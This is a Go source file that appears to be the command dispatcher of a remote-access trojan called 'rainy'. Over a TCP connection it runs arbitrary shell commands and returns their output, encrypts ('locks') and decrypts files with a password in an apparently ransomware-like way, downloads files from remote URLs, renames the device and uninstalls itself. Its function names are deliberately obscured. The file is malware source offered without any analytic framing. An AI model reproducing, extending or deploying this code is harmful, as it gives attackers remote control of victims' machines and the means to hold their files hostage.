package basic

import (
	"net"
	"os"
	"strconv"
	"strings"

	"felix.com/rainy/v1/cmd"
	"felix.com/rainy/v1/device"
	"felix.com/rainy/v1/filelock"
)

func Dispatch(client *net.TCPConn, code string, paras []string) {
	//GET_NAME
	if code == "who" {
		func_0(client, paras)
	} else if code == "name" {
		func_1(client, paras)
	} else if code == "exec" {
		func_2(client, paras)
	} else if code == "lock" {
		func_3(client, paras)
	} else if code == "unlock" {
		func_4(client, paras)
	} else if code == "uninst" {
		func_5(client, paras)
	} else if code == "download" {
		func_6(client, paras)
	}
}

func func_0(client *net.TCPConn, paras []string) {
	client.Write([]byte(device.GetName()))
}

func func_1(client *net.TCPConn, paras []string) {
	name := paras[0]
	device.SetName(name)
}

func func_2(client *net.TCPConn, paras []string) {
	var dir string
	var dirType string
	if strings.ToLower(paras[0]) == "cd" {
		dir = paras[1]
		dirType = "cd"
	}
	if strings.ToLower(paras[0]) == "path" {
		dir = paras[1]
		dirType = "path"
	}
	echo, err := cmd.ExecCmd(strings.Join(paras, " "), dir, dirType)
	if err != nil {
		client.Write([]byte(err.Error()))
		return
	}
	if len(echo) > 0 {
		if len(echo) >= 4096 {
			client.Write(echo[0:4095])
		} else {
			client.Write(echo)
		}
	} else {
		client.Write([]byte("No Echo, But finished"))
	}
}

func func_3(client *net.TCPConn, paras []string) {
	if len(paras) < 3 {
		client.Write([]byte("parameter error"))
		return
	}
	file := paras[0]
	pwd := paras[1]
	extent := paras[2]
	extentKB, err := strconv.Atoi(extent)
	if err != nil {
		client.Write([]byte(err.Error()))
		return
	}
	err = filelock.File_0x01(file, pwd, extentKB)
	if err != nil {
		client.Write([]byte(err.Error()))
		return
	}
	client.Write([]byte("OK"))
}

func func_4(client *net.TCPConn, paras []string) {
	if len(paras) < 3 {
		client.Write([]byte("parameter error"))
		return
	}
	file := paras[0]
	pwd := paras[1]
	extent := paras[2]
	extentKB, err := strconv.Atoi(extent)
	if err != nil {
		client.Write([]byte(err.Error()))
		return
	}
	err = filelock.File_0x02(file, pwd, extentKB)
	if err != nil {
		client.Write([]byte(err.Error()))
		return
	}
	client.Write([]byte("OK"))
}

func func_5(client *net.TCPConn, paras []string) {
	if strings.ToLower(paras[0]) == "yes" {
		err := Letrun(nil, false)
		if err != nil {
			client.Write([]byte(err.Error()))
		} else {
			client.Write([]byte("Uninstalled"))
			os.Exit(0)
		}
	} else {
		client.Write([]byte("Cancel"))
	}
}

func func_6(client *net.TCPConn, paras []string) {
	url := paras[0]
	path := paras[1]
	err := Dld(url, path)
	if err != nil {
		client.Write([]byte(err.Error()))
	} else {
		client.Write([]byte("Finished"))
	}
}
